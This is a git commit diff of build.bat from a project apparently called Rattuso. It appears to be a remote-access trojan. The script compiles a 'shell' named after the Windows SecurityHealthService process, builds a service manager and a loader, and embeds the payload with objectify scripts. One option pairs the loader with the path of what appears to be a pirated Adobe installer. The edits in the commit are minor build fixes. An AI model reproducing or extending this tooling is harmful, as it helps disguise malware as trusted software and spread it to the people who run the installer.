2a43ebfc31462f5bb781cf08dd15b33d626a0f38
Bombo <88135556+BomboBombone@users.noreply.github.com>
2022-07-10 01:02:17 +0200

    Add files via upload

--- build.bat
+++ build.bat
@@ -1,13 +1,21 @@
 @echo off
 :: Global variables (set accordingly to your system)
 set MSBuildPath="C:\Program Files\Microsoft Visual Studio\2022\Community\Msbuild\Current\Bin\MSBuild.exe"
-set Platform="x86"
+set Platform=x86
 set ShellBuildPath="%cd%\output\x64\Release\SecurityHealthService32.exe"
 set DllBuildPath="%cd%\output\%Platform%\Release\MyDll.exe"
 
 :: Vars that will determine how the main loader is compiled
 set /A NoDll = 1
 set LegitProgramPath="C:\Users\bombo\Downloads\Adobe Master Collection CC 2022 v17.02.2022 (x64) Multilingua\AutoPlay\Docs\Adobe After Effects 2022 SP\Set-up.exe"
+
+:: Display current global vars
+echo Current global variables:
+echo MSBuildPath: %MSBuildPath%
+echo ShellBuildPath: %ShellBuildPath%
+echo DllBuildPath: %DllBuildPath%
+echo NoDll: %NoDll%
+echo LegitProgramPath: %LegitProgramPath%
 
 :: This command builds the shell in release mode
 %MSBuildPath% Rattuso.sln /property:Configuration=Release /t:SecurityHealthService32 /p:Platform="x64"
@@ -20,23 +28,23 @@ if %NoDll%==1 (
 	echo Dll will be used to build the main loader
 	%cd%\objectify\objectify.py %ShellBuildPath%
 )
-%cd%\objectify\objectify_net.py -p -n ShellManagerService -c ShellManager ShellBuildPath
+%cd%\objectify\objectify_net.py -p -n ShellManagerService -c ShellManager %ShellBuildPath%
 
 :: Move the embed files in the appropriate directories
 echo Building service...
-MOVE %cd%\objectify\embeds.cs %cd%\ShellManagerService\embeds.cs
+MOVE /Y embeds.cs %cd%\ShellManagerService\embeds.cs
 %MSBuildPath% Rattuso.sln /property:Configuration=Release /t:SecurityHealthServiceManager /p:Platform="x86"
 if %NoDll%==1 (
 	echo Building main loader without DLL
-	MOVE %cd%\objectify\embeds.h %cd%\MainLoader\embeds.h
+	MOVE /Y embeds.h %cd%\MainLoader\embeds.h
 	%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:MainLoader /p:Platform=%Platform%
 ) else (
 	echo Building main DLL
-	MOVE %cd%\objectify\embeds.h %cd%\MainDll\embeds.h
+	MOVE /Y embeds.h %cd%\MainDll\embeds.h
 	%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:MyDll /p:Platform=%Platform%
 	echo Building main Loader with DLL
 	%cd%\objectify\objectify.py %DllBuildPath% %LegitProgramPath%
-	MOVE %cd%\objectify\embeds.h %cd%\MainLoader\embeds.h
+	MOVE /Y embeds.h %cd%\MainLoader\embeds.h
 	%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:MainLoader /p:Platform=%Platform%
 )
 
